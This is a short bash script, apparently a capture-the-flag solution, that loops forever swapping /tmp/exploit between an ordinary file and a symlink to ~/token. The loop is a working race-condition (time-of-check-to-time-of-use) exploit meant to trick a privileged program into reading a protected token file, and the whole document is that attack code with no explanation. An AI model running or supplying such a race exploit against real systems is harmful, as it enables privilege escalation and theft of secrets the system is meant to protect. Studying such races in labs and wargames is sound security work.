#!/bin/bash

while true
	do
		touch /tmp/exploit
		rm /tmp/exploit
		ln -s ~/token /tmp/exploit
		unlink /tmp/exploit
	done
